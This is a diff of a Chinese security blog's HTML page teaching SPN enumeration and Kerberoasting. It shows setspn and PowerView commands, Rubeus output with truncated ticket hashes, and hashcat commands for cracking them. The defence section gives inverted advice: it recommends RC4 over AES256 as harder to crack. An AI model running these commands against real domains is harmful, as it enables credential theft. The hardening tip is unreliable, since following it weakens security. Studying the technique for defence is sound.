@@ -6,19 +6,20 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="0x01 SPNSPN（ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。 SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。如果在整个林或域中">
+    <meta name="description" content="0x01 SPNSPN（ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。 SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。如果在整个林或域">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网安全:Kerberoasting攻击和SPN服务">
 <meta property="og:url" content="https://godzeo.github.io/2020/05/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberoasting%E6%94%BB%E5%87%BB%E5%92%8CSPN%E6%9C%8D%E5%8A%A1/index.html">
 <meta property="og:site_name" content="Zeo 安全实验室">
-<meta property="og:description" content="0x01 SPNSPN（ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。 SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。如果在整个林或域中">
+<meta property="og:description" content="0x01 SPNSPN（ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。 SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。如果在整个林或域">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxNDM2MzIucG5n?x-oss-process=image/format,png">
 <meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxNDMyMjcucG5n?x-oss-process=image/format,png">
 <meta property="article:published_time" content="2020-05-27T02:39:59.000Z">
-<meta property="article:modified_time" content="2020-07-04T09:00:05.393Z">
+<meta property="article:modified_time" content="2020-08-01T08:32:03.895Z">
 <meta property="article:author" content="Zeo">
 <meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="内网">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="二进制">
@@ -57,6 +58,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.0"></head>
 
@@ -166,6 +169,7 @@
     <a id="more"></a>
 
 
+
 <h1 id="0x01-SPN"><a href="#0x01-SPN" class="headerlink" title="0x01 SPN"></a>0x01 SPN</h1><p>SPN（ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。</p>
 <p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p>
 <p>Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN</p>
@@ -184,7 +188,7 @@
 <p>查看test域内的所有SPN：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -T test -q *&#x2F;*</span><br></pre></td></tr></table></figure>
 
-<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-yd2XpX1l-1590547189992)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200518143251.png)]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200518143251.png)]</a></p>
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-yd2XpX1l-1590547189992)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200518143251.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200518143251.png\)\]</a></p>
 <p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN</p>
 <p>有三个：</p>
 <p>域控制器：</p>
@@ -195,8 +199,6 @@
 <p>CN=WIN7,CN=Computers,DC=sun,DC=com</p>
 <p>其他命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看当前域内所有的SPN：setspn  -Q  *&#x2F;*</span><br><span class="line">查看指定域xie.com注册的SPN：setspn -T sun.com -Q *&#x2F;*      如果指定域不存在，则默认切换到查找本域的SPN</span><br><span class="line">查找本域内重复的SPN：setspn -X</span><br><span class="line">删除指定SPN：setspn -D MySQL&#x2F;win7.xie.com:1433&#x2F;MSSQL hack</span><br><span class="line">查找指定用户&#x2F;主机名注册的SPN：setspn -L username&#x2F;hostname</span><br></pre></td></tr></table></figure>
-
-
 
 <h3 id="使用PowerShell脚本"><a href="#使用PowerShell脚本" class="headerlink" title="使用PowerShell脚本"></a>使用PowerShell脚本</h3><ul>
 <li>PowerShell-AD-Recon</li>
@@ -217,7 +219,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1Get-NetUser -SPN</span><br></pre></td></tr></table></figure>
 
 <h1 id="0x03-Kerberoasting攻击"><a href="#0x03-Kerberoasting攻击" class="headerlink" title="0x03 Kerberoasting攻击"></a>0x03 Kerberoasting攻击</h1><h2 id="0x031基于Kerberos认证的原理："><a href="#0x031基于Kerberos认证的原理：" class="headerlink" title="0x031基于Kerberos认证的原理："></a>0x031基于Kerberos认证的原理：</h2><p>基于Kerberos认证，具体认证过程可以参考我之前的文章</p>
-<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-q5UTmw4K-1590547189994)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200527100825.png)]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200527100825.png)]</a></p>
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-q5UTmw4K-1590547189994)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200527100825.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200527100825.png\)\]</a></p>
 <p>1、用户将AS-REQ数据包发送给KDC（Key Distribution Centre，密钥分发中心，此处为域控），进行身份认证。</p>
 <p>2、KDC验证用户的凭据，如果凭据有效，则返回TGT（Ticket-Granting Ticket，票据授予票据）。</p>
 <p>3、如果用户想通过身份认证，访问某个服务（如IIS），那么他需要发起（Ticket Granting Service，票据授予服务）请求，请求中包含TGT以及所请求服务的SPN（Service Principal Name，服务主体名称）。</p>
@@ -250,20 +252,14 @@
 <p>将导出的hashcat格式的哈希保存为hash.txt文件，放到hashcat的目录下</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hashcat64</span><span class="selector-class">.exe</span> <span class="selector-tag">-m</span> 13100 <span class="selector-tag">hash</span><span class="selector-class">.txt</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
 
-
-
 <h3 id="二、使用-Rubeus"><a href="#二、使用-Rubeus" class="headerlink" title="二、使用 Rubeus"></a>二、使用 Rubeus</h3><p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p>
 <p>使用：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>
-
-
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Rubeus&gt;Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line"> ______        _</span><br><span class="line">(_____ \      | |</span><br><span class="line"> _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">|  __  &#x2F;| | | |  _ \| ___ | | | |&#x2F;___)</span><br><span class="line">| |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">|_|   |_|____&#x2F;|____&#x2F;|_____)____&#x2F;(___&#x2F;</span><br><span class="line"></span><br><span class="line">v1.5.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : zeo</span><br><span class="line">[*] DistinguishedName      : CN&#x3D;harmj0y,CN&#x3D;Users,DC&#x3D;zeolab,DC&#x3D;local</span><br><span class="line">[*] ServicePrincipalName   : asdf&#x2F;asdfasdf</span><br><span class="line">[*] Hash                   : $krb5tgs$23$*$zeolab.local$asdf&#x2F;asdfasdf*$AE5F019D4CDED6CD74830CC......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : sqlservice</span><br><span class="line">[*] DistinguishedName      : CN&#x3D;SQL,CN&#x3D;Users,DC&#x3D;zeolab,DC&#x3D;local</span><br><span class="line">[*] ServicePrincipalName   : MSSQLSvc&#x2F;SQL.zeolab.local</span><br><span class="line">[*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc&#x2F;SQL.zeolab.local*$E2B3869290......</span><br></pre></td></tr></table></figure>
 
 <h2 id="0x034离线破解服务票据"><a href="#0x034离线破解服务票据" class="headerlink" title="0x034离线破解服务票据"></a>0x034离线破解服务票据</h2><p>将哈希保存为hash.txt文件，放到hashcat的目录下</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hashcat64</span><span class="selector-class">.exe</span> <span class="selector-tag">-m</span> 13100 <span class="selector-tag">hash</span><span class="selector-class">.txt</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
-
-
 
 <h1 id="0x04-Kerberoast攻击防范"><a href="#0x04-Kerberoast攻击防范" class="headerlink" title="0x04 Kerberoast攻击防范"></a>0x04 Kerberoast攻击防范</h1><ul>
 <li>将默认的AES256_HMAC加密方式改为RC4_HMAC_MD5，增加破解难度</li>
